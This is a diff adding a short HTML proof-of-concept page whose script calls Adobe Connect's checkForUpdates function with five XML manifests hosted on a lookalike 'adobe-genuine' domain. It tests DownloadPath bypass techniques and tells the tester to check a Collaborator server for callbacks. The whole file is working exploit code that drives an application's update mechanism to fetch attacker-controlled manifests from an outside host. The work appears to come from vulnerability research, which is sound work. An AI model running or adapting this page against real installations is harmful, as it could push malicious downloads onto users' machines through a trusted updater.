@@ -1,0 +1,31 @@
+<html><body>
+<div id="o"></div>
+<script>
+var o = document.getElementById('o');
+function log(m) { o.innerHTML += m + '<br>'; }
+
+// Test multiple XML files with different DownloadPath bypass techniques
+// Each XML has a different DownloadPath format
+
+var tests = [
+    'https://adobe-genuine.github.io/connect-poc/xml/test1.xml',
+    'https://adobe-genuine.github.io/connect-poc/xml/test2.xml',
+    'https://adobe-genuine.github.io/connect-poc/xml/test3.xml',
+    'https://adobe-genuine.github.io/connect-poc/xml/test4.xml',
+    'https://adobe-genuine.github.io/connect-poc/xml/test5.xml'
+];
+
+var i = 0;
+function nextTest() {
+    if (i >= tests.length) { log('ALL TESTS DONE - check Collaborator/server'); return; }
+    log('Test ' + (i+1) + ': loading XML...');
+    try {
+        connectApp.checkForUpdates(tests[i], false, true);
+        log('  OK');
+    } catch(e) { log('  Error: ' + e.message); }
+    i++;
+    setTimeout(nextTest, 3000);
+}
+nextTest();
+</script>
+</body></html>
